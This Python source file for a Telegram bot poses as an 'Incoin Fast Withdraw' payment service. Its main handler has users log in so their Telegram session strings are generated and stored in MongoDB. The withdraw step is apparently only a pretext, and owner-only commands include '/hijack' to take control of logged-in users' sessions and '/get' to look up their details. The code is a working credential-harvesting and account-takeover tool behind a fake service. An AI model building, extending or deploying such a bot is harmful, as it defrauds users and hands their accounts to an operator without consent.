from pyromod import Client
from pyrogram import filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.enums import ParseMode
from config import BOT_TOKEN, API_ID, API_HASH, OWNER_ID, MONGO_URI, MONGO_DB_NAME
from login import generate_session, handle_login_responses, delete_session_files, setup_login_callbacks
from hijack import setup_hijack_handlers
from dataCommands import register_data_commands
from pymongo import MongoClient
import pytz
from datetime import datetime
import asyncio
import os
from broadcast import setup_broadcast_handlers


# ----------------------------
# MongoDB Setup
# ----------------------------
mongo_client = MongoClient(MONGO_URI)
db = mongo_client[MONGO_DB_NAME]
started_users = db["started_users"]
logged_in_users = db["logged_in_users"]

# ----------------------------
# Pyrogram Bot Client
# ----------------------------
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ----------------------------
# Global Variables
# ----------------------------
active_userbot = None
pending_user_id = None
user_states = {}
OWNER_COMMANDS_PER_PAGE = 5

# ----------------------------
# Utility Functions
# ----------------------------
async def is_session_alive(session_string):
    try:
        checker = Client("session_checker", api_id=API_ID, api_hash=API_HASH, session_string=session_string, in_memory=True)
        await checker.connect()
        await checker.get_me()
        await checker.disconnect()
        return True
    except Exception:
        return False

async def cleanup_userbot():
    global active_userbot
    if active_userbot:
        try:
            await active_userbot.stop()
        except Exception as e:
            print(f"Error stopping userbot: {e}")
        active_userbot = None

async def is_user_logged_in(user_id):
    user_session = logged_in_users.find_one({"user_id": user_id})
    return user_session and user_session.get("status") == "active"

def non_command_filter(_, __, message):
    return not message.text.startswith('/')

# ----------------------------
# Commands
# ----------------------------
@app.on_message(filters.command("start"))
async def start_command(client: Client, message: Message):
    user = message.from_user
    user_data = {
        "user_id": user.id,
        "name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
        "username": user.username or "N/A",
        "start_time": datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %H:%M:%S"),
        "status": "started"
    }
    started_users.update_one({"user_id": user.id}, {"$set": user_data}, upsert=True)

    welcome_msg = f"""🌟 Hello {user.first_name or 'there'}! 🌟

Welcome to the Incoin Fast Withdraw Bot.

Use the buttons below or run a command to get started!"""

    buttons = [
        [InlineKeyboardButton("🔐 Login", callback_data="trigger:/login"),
         InlineKeyboardButton("💸 Withdraw", callback_data="trigger:/withdraw")],
        [InlineKeyboardButton("📖 Help", callback_data="trigger:/help")]
    ]
    await message.reply_text(welcome_msg, reply_markup=InlineKeyboardMarkup(buttons))

@app.on_callback_query(filters.regex("^trigger:/"))
async def trigger_command(client: Client, query: CallbackQuery):
    command = query.data.replace("trigger:", "")
    fake_message = query.message
    fake_message.from_user = query.from_user
    fake_message.chat = query.message.chat
    fake_message.text = command

    if command == "/login":
        await login_command(client, fake_message)
    elif command == "/help":
        await help_command(client, fake_message)
    elif command == "/withdraw":
        await withdraw_command(client, fake_message)
    else:
        await query.answer("⚠️ Unknown command")

@app.on_message(filters.command("help"))
async def help_command(_, message: Message):
    buttons = [
        [InlineKeyboardButton("🔐 Owner Commands", callback_data="admin_cmds:1")]
    ]
    await message.reply_text("""🤖 <b>Bot Help Menu</b>

Here's what I can do for you:

• /login – Authenticate with your account  
• /logout – Logout from your account  
• /withdraw – Start fast withdraw process  
• /cancel – Cancel any pending operation  
• /start – Show welcome screen with buttons  
• /help – Display this help message  
""", parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(buttons))


OWNER_CMDS = [
    ("/stats","         📊 View overall bot usage statistics"),
    ("/details","       📋 Paginated list of logged-in & started users"),
    ("/get","           🔍 Fetch user details using user ID"),
    ("/hijack","        🎮 Temporarily control another logged-in session"),
    ("/cancel_hijack"," 🛑 Revoke hijack and return control to user"),
]



@app.on_callback_query(filters.regex(r"^admin_cmds:(\d+)$"))
async def admin_commands_pagination(client: Client, query: CallbackQuery):
    user_id = query.from_user.id
    page = int(query.data.split(":")[1])

    if user_id != OWNER_ID:
        await query.answer("😏 Ohh nice try! You're not the admin 😂", show_alert=True)
        return

    start = (page - 1) * OWNER_COMMANDS_PER_PAGE
    end = start + OWNER_COMMANDS_PER_PAGE
    total_pages = (len(OWNER_CMDS) - 1) // OWNER_COMMANDS_PER_PAGE + 1

    text = f"<b>🔐 Owner Only Commands (Page {page}/{total_pages})</b>\n\n"
    for cmd, desc in OWNER_CMDS[start:end]:
        text += f"<code>{cmd}</code> — {desc}\n"

    nav_buttons = []
    if page > 1:
        nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_cmds:{page-1}"))
    if end < len(OWNER_CMDS):
        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"admin_cmds:{page+1}"))

    markup = InlineKeyboardMarkup([nav_buttons]) if nav_buttons else None

    await query.message.edit_text(
        text.strip(),
        parse_mode=ParseMode.HTML,
        reply_markup=markup
    )

@app.on_message(filters.command("login"))
async def login_command(client: Client, message: Message):
    if await is_user_logged_in(message.from_user.id):
        await message.reply("🔒 You're already logged in! No need to login again. 😊")
    else:
        await generate_session(client, message)

@app.on_message(filters.command("logout"))
async def logout_command(client: Client, message: Message):
    user_id = message.from_user.id
    files_deleted = await delete_session_files(user_id)
    logged_in_users.update_one(
        {"user_id": user_id},
        {"$set": {"session_string": None, "status": "inactive"}}
    )
    await message.reply("✅ Logged out successfully" + (" and session files deleted" if files_deleted else ""))

@app.on_message(filters.command("withdraw"))
async def withdraw_command(client: Client, message: Message):
    user_id = message.from_user.id
    user_states[user_id] = "awaiting_withdraw_id"
    try:
        response = await client.ask(
            chat_id=message.chat.id,
            text="💸 Please enter your <b>IncoinPay ID</b>:",
            filters=filters.text,
            timeout=60,
            parse_mode=ParseMode.HTML
        )
        user_states.pop(user_id, None)
        entered_id = response.text.strip()
        if not (entered_id.isdigit() and len(entered_id) in [6, 7]):
            await message.reply("❌ Invalid ID format. Must be 6 or 7 digits.")
            return
        if await is_user_logged_in(user_id):
            await message.reply("🚀 Fast withdraw process will start soon!")
        else:
            await message.reply(
                f"🚀 Got ID: <code>{entered_id}</code>\n\n"
                "🔐 Please login using /login first.",
                parse_mode=ParseMode.HTML
            )
    except asyncio.TimeoutError:
        user_states.pop(user_id, None)
        await message.reply("⏰ Timeout! Please try /withdraw again.")

@app.on_message(filters.command("cancel"))
async def cancel_command(_, message: Message):
    if user_states.pop(message.from_user.id, None):
        await message.reply("❌ Operation cancelled.")
    else:
        await message.reply("⚠️ No operation was pending.")

@app.on_message(filters.private & filters.text & filters.create(non_command_filter))
async def handle_messages(client: Client, message: Message):
    if pending_user_id and message.from_user.id == OWNER_ID:
        return
    await handle_login_responses(client, message)

# ----------------------------
# Main Runner
# ----------------------------
if __name__ == "__main__":
    setup_hijack_handlers(app)
    register_data_commands(app)
    setup_login_callbacks(app)
    setup_broadcast_handlers(app)
    print("🤖 Bot is starting...")
    app.run()
